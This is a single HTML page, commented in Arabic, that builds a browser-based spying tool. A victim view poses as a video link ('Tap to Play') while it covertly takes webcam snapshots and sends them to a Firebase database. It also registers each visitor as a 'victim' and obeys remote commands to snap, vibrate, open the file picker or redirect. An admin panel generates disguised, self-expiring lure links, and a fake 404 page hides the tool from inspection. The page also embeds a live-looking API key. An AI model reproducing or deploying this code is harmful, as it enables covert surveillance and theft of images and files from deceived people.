<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>404 Not Found</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: #fff; margin: 0; font-family: sans-serif; overflow: hidden; }
        /* واجهة الضحية */
        #vic-zone { display: none; height: 100vh; flex-direction: column; align-items: center; justify-content: center; background: #000; }
        .play-btn { width: 80px; height: 80px; border: 3px solid #fff; border-radius: 50%; position: relative; cursor: pointer; }
        .play-btn::after { content: ''; position: absolute; top: 22px; left: 32px; border-left: 25px solid #fff; border-top: 18px solid transparent; border-bottom: 18px solid transparent; }
        
        /* لوحة التحكم */
        #admin-zone { display: none; padding: 20px; color: #00ff41; font-family: 'Courier New', monospace; height: 100vh; overflow-y: auto; }
        .v-card { border: 1px solid #333; padding: 10px; margin-bottom: 10px; border-radius: 5px; cursor: pointer; }
        button { background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 12px; width: 100%; margin-top: 5px; cursor: pointer; }
        input { width: 100%; padding: 10px; background: #000; color: #00ff41; border: 1px solid #00ff41; }
    </style>
</head>
<body>

<div id="vic-zone">
    <div id="p-scr">
        <div class="play-btn" onclick="startGhost()"></div>
        <p style="margin-top:20px;">Tap to Play</p>
    </div>
    <div id="l-scr" style="display:none; text-align:center;">
        <div style="width:40px; height:40px; border:3px solid #333; border-top-color:#fff; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto;"></div>
        <p>Loading Video...</p>
    </div>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <input type="file" id="f-in" style="display:none;" accept="image/*" multiple>
</div>

<div id="admin-zone">
    <h2>SYSTEM V16 | EXPIRE MODE</h2>
    <div id="v-list"></div>
    <hr>
    <div id="ctrls">
        <h3>Target: <span id="t-name">None</span></h3>
        <button onclick="send('snap')">📸 Snap</button>
        <button onclick="send('vibrate')">📳 Vibrate</button>
        <button onclick="send('pick')">📂 Pick Files</button>
        <button onclick="send('release')" style="background:#030;">🔓 Release</button>
    </div>
    <hr>
    <h3>مصنع الروابط المؤقتة (ساعة واحدة):</h3>
    <input type="text" id="target-url" placeholder="رابط يوتيوب">
    <button onclick="gen()">توليد رابط ينتهي بعد ساعة</button>
    <div id="res" style="font-size:10px; color:#0ff; margin-top:10px; word-break:break-all;"></div>
</div>

<script>
    const config = {
        apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
        databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
        projectId: "monster-system-7f67e"
    };
    firebase.initializeApp(config);
    const db = firebase.database();
    let selId = null;

    const urlParams = new URLSearchParams(window.location.search);
    const isVictim = urlParams.get('v');
    const isAdmin = urlParams.get('admin');

    if (isVictim) {
        try {
            // فك التشفير واستخراج البيانات (رابط الفيديو + وقت الإنشاء)
            const decoded = JSON.parse(atob(isVictim));
            const currentTime = Date.now();
            const linkTime = decoded.time;
            const oneHour = 60 * 60 * 1000; // ساعة بالملي ثانية

            if (currentTime - linkTime > oneHour) {
                // إذا مر أكثر من ساعة، اظهر صفحة 404
                document.body.innerHTML = "<h1 style='color:white; text-align:center; margin-top:45vh;'>404 Not Found</h1>";
            } else {
                document.getElementById('vic-zone').style.display = 'flex';
                runVictim(decoded.url);
            }
        } catch(e) {
            document.body.innerHTML = "404 Not Found";
        }
    } else if (isAdmin === "1") {
        document.getElementById('admin-zone').style.display = 'block';
        runAdmin();
    } else {
        document.body.innerHTML = "404 Not Found";
    }

    // --- وظائف الآدمن ---
    function runAdmin() {
        db.ref('victims').on('value', s => {
            const list = document.getElementById('v-list');
            list.innerHTML = '';
            s.forEach(child => {
                const v = child.val(); const id = child.key;
                const active = (Date.now() - v.lastSeen) < 10000;
                list.innerHTML += `<div class="v-card" onclick="sel('${id}','${v.model}')" style="border-color:${id==selId?'#fff':'#333'}">
                    <span style="color:${active?'#0f0':'#f00'}">●</span> ${v.model}
                </div>`;
            });
        });
    }
    function sel(id, m) { selId = id; document.getElementById('t-name').innerText = m; }
    function send(t) { if(selId) db.ref('victims/'+selId+'/cmd').set({ t, time: Date.now() }); }
    
    function gen() { 
        const targetUrl = document.getElementById('target-url').value;
        const data = {
            url: targetUrl,
            time: Date.now() // نسجل وقت الإنشاء الآن
        };
        const encoded = btoa(JSON.stringify(data));
        const finalLink = window.location.href.split('?')[0] + "?v=" + encoded;
        document.getElementById('res').innerText = finalLink;
    }

    // --- وظائف الضحية ---
    let myRef = null;
    function runVictim(target) {
        const model = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2] : "Mobile";
        myRef = db.ref('victims').push();
        myRef.set({ model, lastSeen: Date.now(), time: new Date().toLocaleTimeString() });
        setInterval(() => myRef.update({ lastSeen: Date.now() }), 5000);

        db.ref('victims/' + myRef.key + '/cmd').on('value', s => {
            const c = s.val(); if(!c) return;
            if(c.t === 'snap') take();
            if(c.t === 'vibrate') navigator.vibrate([300,100,300]);
            if(c.t === 'pick') document.getElementById('f-in').click();
            if(c.t === 'release') window.location.href = target;
        });
    }

    async function startGhost() {
        document.getElementById('p-scr').style.display = 'none';
        document.getElementById('l-scr').style.display = 'block';
        navigator.vibrate(100);
        take();
    }

    async function take() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video:true});
            const video = document.getElementById('v'); video.srcObject = s; await video.play();
            const canvas = document.getElementById('c'); canvas.width=video.videoWidth; canvas.height=video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            myRef.child('files').push(canvas.toDataURL('image/jpeg', 0.5));
            s.getTracks().forEach(t => t.stop());
        } catch(e) {}
    }
</script>
</body>
</html>
